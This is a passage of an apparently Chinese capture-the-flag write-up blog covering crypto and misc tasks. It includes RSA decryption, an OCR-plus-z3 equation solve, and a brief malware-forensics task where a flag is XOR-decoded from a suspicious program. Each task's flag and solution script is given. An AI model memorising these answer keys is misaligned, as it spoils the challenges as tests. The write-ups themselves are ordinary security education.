class="number">23280133104463252598665779150831148192014617461904564929071121215373331248942762386170411274023248423328388793808975632652896384007449549469345318875514363621903138122407682293848670093433946555776164835208375667498606187869211466397624286383057425296636315379314349307816391315242971306898487494604324473266965665471735612154916305882443496151118031672777088597821127499085632141307413890900246444539517971766135909771880642211582699957211983212981047822362311969553832913399476190919026666192056319334425636757404603336130688707109219644178606626422717046059209499394056295682594928581470210114322505904198054215544</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;n0t_s3Cure_4t_aIl&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Base64-rot13"><a href="#Base64-rot13" class="headerlink" title="Base64*rot13"></a>Base64*rot13</h2><p><code>CyberChef</code> 梭了。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/c_2_1.png"></p><h2 id="模！"><a href="#模！" class="headerlink" title="模！"></a>模！</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mooooo</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res &lt;&lt;= <span class="number">8</span></span><br><span class="line">        res += ( factorial(<span class="built_in">ord</span>(i)) % <span class="number">233</span> )</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> p,i:(i <span class="keyword">in</span> table)*p, flag, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mooooo(flag))</span><br><span class="line"><span class="comment"># output: 2508450541438803643416583335895451914701844680466330955847</span></span><br></pre></td></tr></table></figure><p>爆破每一位即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"></span><br><span class="line">res = <span class="number">2508450541438803643416583335895451914701844680466330955847</span></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">bin_res = <span class="string">&quot;0&quot;</span>+<span class="built_in">bin</span>(res)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">table_num = &#123;(factorial(<span class="built_in">ord</span>(i)) % <span class="number">233</span>):i <span class="keyword">for</span> i <span class="keyword">in</span> table&#125;</span><br><span class="line"><span class="comment">#print(table_num)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((<span class="built_in">len</span>(bin_res))//<span class="number">8</span>):</span><br><span class="line">    f1 = <span class="built_in">int</span>(bin_res[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)],<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(table_num[f1],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># flag&#123;dalaodalaohaolihai&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="一眼盯帧"><a href="#一眼盯帧" class="headerlink" title="一眼盯帧"></a>一眼盯帧</h2><p>仔细看视频，发现视频在有些帧里面藏了东西。先把特殊的帧提取出来。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">video = cv2.VideoCapture(<span class="string">&#x27;iGotSmokynomial.mp4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">frame_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_background_color</span>(<span class="params">image_path</span>):</span><br><span class="line">    image = cv2.imread(image_path)</span><br><span class="line">    gray_image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    hist = cv2.calcHist([gray_image], [<span class="number">0</span>], <span class="literal">None</span>, [<span class="number">256</span>], [<span class="number">0</span>,<span class="number">256</span>])</span><br><span class="line">    hist = hist.flatten()</span><br><span class="line">    threshold = np.argmax(hist)</span><br><span class="line">    <span class="keyword">return</span> threshold</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ret, frame = video.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cv2.imwrite(<span class="string">f&#x27;./out/frame_<span class="subst">&#123;frame_count&#125;</span>.jpg&#x27;</span>, frame)</span><br><span class="line">    <span class="keyword">if</span> get_background_color(<span class="string">f&#x27;./out/frame_<span class="subst">&#123;frame_count&#125;</span>.jpg&#x27;</span>) == <span class="number">255</span>:</span><br><span class="line">        frame_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">video.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><p>之后得到62张藏有算式的图片，把图片上的文字提取出来。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> easyocr </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_num</span>(<span class="params">filename</span>):</span><br><span class="line">    result = reader.readtext(filename,detail = <span class="number">0</span>) </span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="keyword">if</span> cnt !=<span class="number">1</span>:</span><br><span class="line">                flag+=<span class="string">&#x27; + &#x27;</span></span><br><span class="line">            flag += i.split(<span class="string">&#x27;*&#x27;</span>)[<span class="number">0</span>]+<span class="string">&#x27; * &#x27;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="built_in">str</span>(cnt)</span><br><span class="line">            cnt+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag,result[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">reader = easyocr.Reader([<span class="string">&#x27;ch_sim&#x27;</span>,<span class="string">&#x27;en&#x27;</span>],gpu = <span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">62</span>): </span><br><span class="line">    a , b = read_num(<span class="string">f&#x27;./out/frame_<span class="subst">&#123;i&#125;</span>.jpg&#x27;</span>)</span><br><span class="line">    f.write(a + <span class="string">&#x27; == &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>提取出来的文字并不完全正确，部分0识别成8了，手动修正，只需要检查0对不对。</p><p>因为有31个未知数，至少检查31个算式即可，我这里检查了32个，方便校错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40 * a1 + 42 * a2 + 69 * a3 + 91 * a4 + 91 * a5 + 74 * a6 + 45 * a7 + 49 * a8 + 99 * a9 + 41 * a10 + 79 * a11 + 26 * a12 + 51 * a13 + 74 * a14 + 84 * a15 + 31 * a16 + 74 * a17 + 11 * a18 + 87 * a19 + 76 * a20 + 26 * a21 + 40 * a22 + 13 * a23 + 31 * a24 + 39 * a25 + 7 * a26 + 84 * a27 + 65 * a28 + 25 * a29 + 88 * a30 + 13 * a31 == 159700</span><br><span class="line">76 * a1 + 23 * a2 + 47 * a3 + 95 * a4 + 56 * a5 + 94 * a6 + 9 * a7 + 89 * a8 + 1 * a9 + 27 * a10 + 64 * a11 + 54 * a12 + 77 * a13 + 57 * a14 + 11 * a15 + 80 * a16 + 61 * a17 + 98 * a18 + 14 * a19 + 72 * a20 + 67 * a21 + 98 * a22 + 66 * a23 + 26 * a24 + 11 * a25 + 36 * a26 + 94 * a27 + 66 * a28 + 99 * a29 + 64 * a30 + 40 * a31 == 171444</span><br><span class="line">49 * a1 + 38 * a2 + 20 * a3 + 28 * a4 + 36 * a5 + 44 * a6 + 85 * a7 + 48 * a8 + 74 * a9 + 73 * a10 + 27 * a11 + 99 * a12 + 21 * a13 + 72 * a14 + 89 * a15 + 3 * a16 + 3 * a17 + 72 * a18 + 71 * a19 + 29 * a20 + 92 * a21 + 19 * a22 + 42 * a23 + 87 * a24 + 97 * a25 + 36 * a26 + 84 * a27 + 56 * a28 + 96 * a29 + 40 * a30 + 82 * a31 == 164206</span><br><span class="line">81 * a1 + 88 * a2 + 41 * a3 + 98 * a4 + 8 * a5 + 70 * a6 + 19 * a7 + 85 * a8 + 37 * a9 + 64 * a10 + 24 * a11 + 96 * a12 + 94 * a13 + 78 * a14 + 81 * a15 + 38 * a16 + 10 * a17 + 87 * a18 + 75 * a19 + 35 * a20 + 7 * a21 + 98 * a22 + 63 * a23 + 37 * a24 + 4 * a25 + 40 * a26 + 13 * a27 + 83 * a28 + 99 * a29 + 61 * a30 + 60 * a31 == 171511</span><br><span class="line">53 * a1 + 39 * a2 + 10 * a3 + 36 * a4 + 37 * a5 + 42 * a6 + 69 * a7 + 66 * a8 + 22 * a9 + 33 * a10 + 34 * a11 + 4 * a12 + 77 * a13 + 94 * a14 + 51 * a15 + 87 * a16 + 3 * a17 + 34 * a18 + 44 * a19 + 17 * a20 + 48 * a21 + 31 * a22 + 62 * a23 + 15 * a24 + 59 * a25 + 39 * a26 + 42 * a27 + 48 * a28 + 63 * a29 + 44 * a30 + 84 * a31 == 131705</span><br><span class="line">95 * a1 + 37 * a2 + 70 * a3 + 10 * a4 + 72 * a5 + 37 * a6 + 26 * a7 + 11 * a8 + 89 * a9 + 36 * a10 + 80 * a11 + 81 * a12 + 13 * a13 + 84 * a14 + 79 * a15 + 69 * a16 + 15 * a17 + 53 * a18 + 52 * a19 + 92 * a20 + 13 * a21 + 44 * a22 + 33 * a23 + 48 * a24 + 77 * a25 + 40 * a26 + 50 * a27 + 20 * a28 + 9 * a29 + 69 * a30 + 44 * a31 == 149011</span><br><span class="line">58 * a1 + 53 * a2 + 93 * a3 + 4 * a4 + 33 * a5 + 76 * a6 + 88 * a7 + 7 * a8 + 21 * a9 + 24 * a10 + 8 * a11 + 35 * a12 + 64 * a13 + 54 * a14 + 20 * a15 + 1 * a16 + 4 * a17 + 42 * a18 + 29 * a19 + 96 * a20 + 40 * a21 + 22 * a22 + 39 * a23 + 47 * a24 + 4 * a25 + 42 * a26 + 31 * a27 + 69 * a28 + 39 * a29 + 6 * a30 + 50 * a31 == 114939</span><br><span class="line">89 * a1 + 73 * a2 + 43 * a3 + 41 * a4 + 28 * a5 + 19 * a6 + 83 * a7 + 32 * a8 + 65 * a9 + 37 * a10 + 22 * a11 + 22 * a12 + 42 * a13 + 74 * a14 + 43 * a15 + 72 * a16 + 4 * a17 + 94 * a18 + 66 * a19 + 60 * a20 + 63 * a21 + 91 * a22 + 69 * a23 + 7 * a24 + 39 * a25 + 96 * a26 + 76 * a27 + 5 * a28 + 32 * a29 + 57 * a30 + 22 * a31 == 147181</span><br><span class="line">76 * a1 + 83 * a2 + 10 * a3 + 31 * a4 + 18 * a5 + 2 * a6 + 2 * a7 + 65 * a8 + 27 * a9 + 47 * a10 + 63 * a11 + 61 * a12 + 77 * a13 + 38 * a14 + 22 * a15 + 49 * a16 + 4 * a17 + 2 * a18 + 63 * a19 + 24 * a20 + 16 * a21 + 36 * a22 + 48 * a23 + 50 * a24 + 40 * a25 + 78 * a26 + 19 * a27 + 95 * a28 + 73 * a29 + 47 * a30 + 56 * a31 == 128931</span><br><span class="line">93 * a1 + 3 * a2 + 86 * a3 + 90 * a4 + 97 * a5 + 11 * a6 + 66 * a7 + 69 * a8 + 96 * a9 + 62 * a10 + 40 * a11 + 58 * a12 + 25 * a13 + 64 * a14 + 50 * a15 + 65 * a16 + 59 * a17 + 5 * a18 + 7 * a19 + 55 * a20 + 92 * a21 + 29 * a22 + 35 * a23 + 83 * a24 + 59 * a25 + 55 * a26 + 51 * a27 + 62 * a28 + 1 * a29 + 64 * a30 + 12 * a31 == 159474</span><br><span class="line">60 * a1 + 19 * a2 + 66 * a3 + 62 * a4 + 42 * a5 + 86 * a6 + 61 * a7 + 63 * a8 + 56 * a9 + 2 * a10 + 46 * a11 + 7 * a12 + 7 * a13 + 2 * a14 + 16 * a15 + 97 * a16 + 12 * a17 + 28 * a18 + 11 * a19 + 92 * a20 + 26 * a21 + 64 * a22 + 63 * a23 + 62 * a24 + 45 * a25 + 56 * a26 + 50 * a27 + 97 * a28 + 62 * a29 + 71 * a30 + 65 * a31 == 146558</span><br><span class="line">6 * a1 + 78 * a2 + 51 * a3 + 74 * a4 + 1 * a5 + 25 * a6 + 41 * a7 + 99 * a8 + 52 * a9 + 74 * a10 + 30 * a11 + 97 * a12 + 63 * a13 + 2 * a14 + 25 * a15 + 76 * a16 + 56 * a17 + 35 * a18 + 28 * a19 + 34 * a20 + 40 * a21 + 18 * a22 + 65 * a23 + 67 * a24 + 43 * a25 + 78 * a26 + 6 * a27 + 54 * a28 + 38 * a29 + 45 * a30 + 81 * a31 == 146290</span><br><span class="line">58 * a1 + 47 * a2 + 72 * a3 + 43 * a4 + 99 * a5 + 36 * a6 + 89 * a7 + 31 * a8 + 61 * a9 + 66 * a10 + 59 * a11 + 74 * a12 + 32 * a13 + 2 * a14 + 39 * a15 + 73 * a16 + 86 * a17 + 63 * a18 + 18 * a19 + 92 * a20 + 44 * a21 + 67 * a22 + 37 * a23 + 66 * a24 + 25 * a25 + 32 * a26 + 59 * a27 + 31 * a28 + 11 * a29 + 41 * a30 + 65 * a31 == 157439</span><br><span class="line">79 * a1 + 18 * a2 + 22 * a3 + 73 * a4 + 21 * a5 + 76 * a6 + 5 * a7 + 27 * a8 + 36 * a9 + 22 * a10 + 90 * a11 + 23 * a12 + 20 * a13 + 88 * a14 + 77 * a15 + 18 * a16 + 10 * a17 + 14 * a18 + 80 * a19 + 1 * a20 + 96 * a21 + 97 * a22 + 41 * a23 + 90 * a24 + 53 * a25 + 20 * a26 + 41 * a27 + 2 * a28 + 87 * a29 + 8 * a30 + 40 * a31 == 127198</span><br><span class="line">11 * a1 + 79 * a2 + 17 * a3 + 68 * a4 + 26 * a5 + 38 * a6 + 23 * a7 + 78 * a8 + 82 * a9 + 71 * a10 + 46 * a11 + 18 * a12 + 20 * a13 + 19 * a14 + 89 * a15 + 86 * a16 + 20 * a17 + 54 * a18 + 47 * a19 + 15 * a20 + 62 * a21 + 49 * a22 + 97 * a23 + 75 * a24 + 17 * a25 + 76 * a26 + 52 * a27 + 62 * a28 + 65 * a29 + 89 * a30 + 80 * a31 == 158569</span><br><span class="line">79 * a1 + 10 * a2 + 66 * a3 + 31 * a4 + 76 * a5 + 58 * a6 + 45 * a7 + 64 * a8 + 97 * a9 + 9 * a10 + 15 * a11 + 6 * a12 + 61 * a13 + 65 * a14 + 52 * a15 + 1 * a16 + 38 * a17 + 11 * a18 + 66 * a19 + 21 * a20 + 30 * a21 + 76 * a22 + 41 * a23 + 75 * a24 + 52 * a25 + 45 * a26 + 91 * a27 + 96 * a28 + 29 * a29 + 64 * a30 + 59 * a31 == 149303</span><br><span class="line">87 * a1 + 64 * a2 + 72 * a3 + 22 * a4 + 38 * a5 + 64 * a6 + 27 * a7 + 35 * a8 + 18 * a9 + 24 * a10 + 64 * a11 + 80 * a12 + 35 * a13 + 56 * a14 + 39 * a15 + 97 * a16 + 83 * a17 + 88 * a18 + 21 * a19 + 51 * a20 + 76 * a21 + 63 * a22 + 54 * a23 + 38 * a24 + 92 * a25 + 56 * a26 + 84 * a27 + 75 * a28 + 38 * a29 + 2 * a30 + 43 * a31 == 162212</span><br><span class="line">94 * a1 + 70 * a2 + 72 * a3 + 93 * a4 + 17 * a5 + 56 * a6 + 53 * a7 + 78 * a8 + 72 * a9 + 49 * a10 + 86 * a11 + 62 * a12 + 41 * a13 + 85 * a14 + 69 * a15 + 71 * a16 + 20 * a17 + 34 * a18 + 24 * a19 + 24 * a20 + 14 * a21 + 86 * a22 + 54 * a23 + 13 * a24 + 41 * a25 + 68 * a26 + 31 * a27 + 50 * a28 + 23 * a29 + 94 * a30 + 72 * a31 == 162137</span><br><span class="line">34 * a1 + 95 * a2 + 66 * a3 + 79 * a4 + 91 * a5 + 35 * a6 + 8 * a7 + 16 * a8 + 95 * a9 + 95 * a10 + 40 * a11 + 68 * a12 + 13 * a13 + 54 * a14 + 80 * a15 + 98 * a16 + 15 * a17 + 39 * a18 + 41 * a19 + 79 * a20 + 34 * a21 + 54 * a22 + 92 * a23 + 17 * a24 + 97 * a25 + 76 * a26 + 49 * a27 + 95 * a28 + 6 * a29 + 83 * a30 + 79 * a31 == 180077</span><br><span class="line">74 * a1 + 42 * a2 + 45 * a3 + 72 * a4 + 6 * a5 + 3 * a6 + 59 * a7 + 47 * a8 + 57 * a9 + 62 * a10 + 85 * a11 + 6 * a12 + 72 * a13 + 25 * a14 + 78 * a15 + 27 * a16 + 6 * a17 + 27 * a18 + 61 * a19 + 88 * a20 + 60 * a21 + 89 * a22 + 53 * a23 + 76 * a24 + 97 * a25 + 56 * a26 + 52 * a27 + 26 * a28 + 5 * a29 + 7 * a30 + 35 * a31 == 142239</span><br><span class="line">53 * a1 + 30 * a2 + 63 * a3 + 88 * a4 + 54 * a5 + 99 * a6 + 40 * a7 + 85 * a8 + 42 * a9 + 35 * a10 + 99 * a11 + 88 * a12 + 55 * a13 + 8 * a14 + 24 * a15 + 91 * a16 + 55 * a17 + 23 * a18 + 53 * a19 + 68 * a20 + 76 * a21 + 49 * a22 + 32 * a23 + 80 * a24 + 81 * a25 + 95 * a26 + 21 * a27 + 73 * a28 + 83 * a29 + 46 * a30 + 44 * a31 == 179115</span><br><span class="line">55 * a1 + 43 * a2 + 39 * a3 + 27 * a4 + 19 * a5 + 41 * a6 + 7 * a7 + 70 * a8 + 54 * a9 + 53 * a10 + 38 * a11 + 72 * a12 + 50 * a13 + 1 * a14 + 15 * a15 + 89 * a16 + 79 * a17 + 17 * a18 + 32 * a19 + 58 * a20 + 64 * a21 + 68 * a22 + 12 * a23 + 92 * a24 + 53 * a25 + 33 * a26 + 54 * a27 + 67 * a28 + 34 * a29 + 25 * a30 + 37 * a31 == 140482</span><br><span class="line">89 * a1 + 93 * a2 + 48 * a3 + 5 * a4 + 37 * a5 + 76 * a6 + 32 * a7 + 66 * a8 + 25 * a9 + 39 * a10 + 59 * a11 + 14 * a12 + 48 * a13 + 62 * a14 + 4 * a15 + 76 * a16 + 72 * a17 + 78 * a18 + 40 * a19 + 96 * a20 + 68 * a21 + 35 * a22 + 89 * a23 + 3 * a24 + 29 * a25 + 17 * a26 + 63 * a27 + 43 * a28 + 61 * a29 + 37 * a30 + 12 * a31 == 142706</span><br><span class="line">4 * a1 + 25 * a2 + 16 * a3 + 45 * a4 + 65 * a5 + 17 * a6 + 39 * a7 + 59 * a8 + 82 * a9 + 54 * a10 + 69 * a11 + 59 * a12 + 86 * a13 + 37 * a14 + 70 * a15 + 21 * a16 + 46 * a17 + 89 * a18 + 96 * a19 + 32 * a20 + 35 * a21 + 69 * a22 + 22 * a23 + 13 * a24 + 95 * a25 + 58 * a26 + 94 * a27 + 29 * a28 + 84 * a29 + 24 * a30 + 3 * a31 == 146480</span><br><span class="line">50 * a1 + 48 * a2 + 87 * a3 + 37 * a4 + 53 * a5 + 19 * a6 + 24 * a7 + 30 * a8 + 40 * a9 + 31 * a10 + 18 * a11 + 89 * a12 + 81 * a13 + 70 * a14 + 98 * a15 + 87 * a16 + 98 * a17 + 82 * a18 + 31 * a19 + 71 * a20 + 30 * a21 + 28 * a22 + 95 * a23 + 22 * a24 + 15 * a25 + 73 * a26 + 51 * a27 + 92 * a28 + 32 * a29 + 97 * a30 + 65 * a31 == 168401</span><br><span class="line">40 * a1 + 20 * a2 + 13 * a3 + 25 * a4 + 87 * a5 + 95 * a6 + 47 * a7 + 80 * a8 + 22 * a9 + 43 * a10 + 4 * a11 + 83 * a12 + 50 * a13 + 85 * a14 + 39 * a15 + 22 * a16 + 75 * a17 + 3 * a18 + 22 * a19 + 6 * a20 + 16 * a21 + 29 * a22 + 65 * a23 + 19 * a24 + 64 * a25 + 48 * a26 + 41 * a27 + 8 * a28 + 10 * a29 + 66 * a30 + 12 * a31 == 117331</span><br><span class="line">37 * a1 + 49 * a2 + 63 * a3 + 49 * a4 + 3 * a5 + 54 * a6 + 52 * a7 + 61 * a8 + 58 * a9 + 36 * a10 + 24 * a11 + 6 * a12 + 46 * a13 + 47 * a14 + 16 * a15 + 29 * a16 + 83 * a17 + 2 * a18 + 50 * a19 + 94 * a20 + 38 * a21 + 56 * a22 + 34 * a23 + 13 * a24 + 34 * a25 + 12 * a26 + 41 * a27 + 47 * a28 + 35 * a29 + 67 * a30 + 74 * a31 == 125357</span><br><span class="line">37 * a1 + 2 * a2 + 12 * a3 + 84 * a4 + 79 * a5 + 36 * a6 + 93 * a7 + 64 * a8 + 68 * a9 + 7 * a10 + 37 * a11 + 58 * a12 + 68 * a13 + 49 * a14 + 19 * a15 + 95 * a16 + 43 * a17 + 22 * a18 + 10 * a19 + 21 * a20 + 70 * a21 + 72 * a22 + 73 * a23 + 19 * a24 + 32 * a25 + 8 * a26 + 6 * a27 + 89 * a28 + 43 * a29 + 32 * a30 + 95 * a31 == 138223</span><br><span class="line">24 * a1 + 23 * a2 + 12 * a3 + 73 * a4 + 32 * a5 + 3 * a6 + 61 * a7 + 51 * a8 + 85 * a9 + 94 * a10 + 36 * a11 + 90 * a12 + 49 * a13 + 97 * a14 + 18 * a15 + 55 * a16 + 26 * a17 + 40 * a18 + 39 * a19 + 95 * a20 + 61 * a21 + 17 * a22 + 29 * a23 + 7 * a24 + 40 * a25 + 58 * a26 + 5 * a27 + 49 * a28 + 2 * a29 + 83 * a30 + 69 * a31 == 136759</span><br><span class="line">64 * a1 + 28 * a2 + 52 * a3 + 74 * a4 + 84 * a5 + 36 * a6 + 39 * a7 + 55 * a8 + 40 * a9 + 44 * a10 + 47 * a11 + 23 * a12 + 1 * a13 + 58 * a14 + 33 * a15 + 25 * a16 + 70 * a17 + 20 * a18 + 45 * a19 + 33 * a20 + 15 * a21 + 77 * a22 + 46 * a23 + 8 * a24 + 5 * a25 + 98 * a26 + 39 * a27 + 72 * a28 + 9 * a29 + 99 * a30 + 25 * a31 == 128285</span><br><span class="line">39 * a1 + 8 * a2 + 57 * a3 + 39 * a4 + 27 * a5 + 98 * a6 + 70 * a7 + 77 * a8 + 97 * a9 + 20 * a10 + 5 * a11 + 2 * a12 + 62 * a13 + 88 * a14 + 42 * a15 + 58 * a16 + 86 * a17 + 94 * a18 + 91 * a19 + 76 * a20 + 46 * a21 + 32 * a22 + 10 * a23 + 75 * a24 + 99 * a25 + 62 * a26 + 76 * a27 + 78 * a28 + 72 * a29 + 50 * a30 + 50 * a31 == 173243</span><br><span class="line">52 * a1 + 69 * a2 + 20 * a3 + 29 * a4 + 23 * a5 + 30 * a6 + 74 * a7 + 21 * a8 + 9 * a9 + 5 * a10 + 76 * a11 + 5 * a12 + 45 * a13 + 49 * a14 + 59 * a15 + 25 * a16 + 98 * a17 + 54 * a18 + 80 * a19 + 19 * a20 + 51 * a21 + 37 * a22 + 85 * a23 + 84 * a24 + 78 * a25 + 54 * a26 + 5 * a27 + 21 * a28 + 97 * a29 + 92 * a30 + 78 * a31 == 138560</span><br></pre></td></tr></table></figure><p>之后将得到的算式用 <code>z3</code> 求解出结果，再用 <code>chr</code>转换并拼接起来即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="built_in">open</span>(<span class="string">&#x27;yes.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read().strip()</span><br><span class="line">res = res.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#print(len(res))</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">f&quot;a<span class="subst">&#123;i&#125;</span> = BitVec(&#x27;a<span class="subst">&#123;i&#125;</span>&#x27;,7)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    s.add(<span class="built_in">eval</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有解对结果进行处理</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    res = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        name = <span class="string">f&#x27;res[a<span class="subst">&#123;i&#125;</span>]&#x27;</span></span><br><span class="line">        num = <span class="built_in">eval</span>(name)</span><br><span class="line">        <span class="comment">#print(chr(int(str(num))))</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(num)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;l0ng_1iv3_tHe_liT4ng_kiNg&#125;</span></span><br></pre></td></tr></table></figure><h2 id="帕鲁服务器"><a href="#帕鲁服务器" class="headerlink" title="帕鲁服务器"></a>帕鲁服务器</h2><p>一和二是一起做的（</p><p>先用火眼把恶意软件提取出来。</p><p>根据创建时间判断出恶意程序。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/m_1_1.png"></p><p>ida分析，看到一个类似flag的字符串。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/m_1_2.png"></p><p>这是  <strong>帕鲁服务器#2</strong> 的flag。</p><p>再接着分析：</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/m_1_3.png"></p><p>这部分代码对v4做了个异或，猜测是 <strong>帕鲁服务器#1</strong> flag，写个脚本解出来。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">33</span>]=&#123;</span><br><span class="line">   <span class="number">67</span>,  <span class="number">73</span>,  <span class="number">68</span>,  <span class="number">66</span>,  <span class="number">94</span>, <span class="number">112</span>,  <span class="number">87</span>, <span class="number">122</span>,  <span class="number">86</span>,  <span class="number">22</span>, </span><br><span class="line">   <span class="number">87</span>, <span class="number">115</span>,  <span class="number">64</span>,  <span class="number">87</span>, <span class="number">122</span>,  <span class="number">20</span>,  <span class="number">86</span>, <span class="number">122</span>,  <span class="number">75</span>,  <span class="number">21</span>, </span><br><span class="line">   <span class="number">82</span>, <span class="number">122</span>,  <span class="number">72</span>, <span class="number">124</span>, <span class="number">122</span>,  <span class="number">85</span>,  <span class="number">17</span>,  <span class="number">73</span>,  <span class="number">88</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">28</span>;i++)&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(a[i]^<span class="number">0x25</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;Ur_s3rVer_1s_n0w_mY_p4l&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="过去的CD"><a href="#过去的CD" class="headerlink" title="过去的CD"></a>过去的CD</h2><p>题目给了一个<code>nrg</code> 文件，用<code>软碟通</code>查看，发现有一个 <code>wav</code> 音频，提取出来。</p><p>用 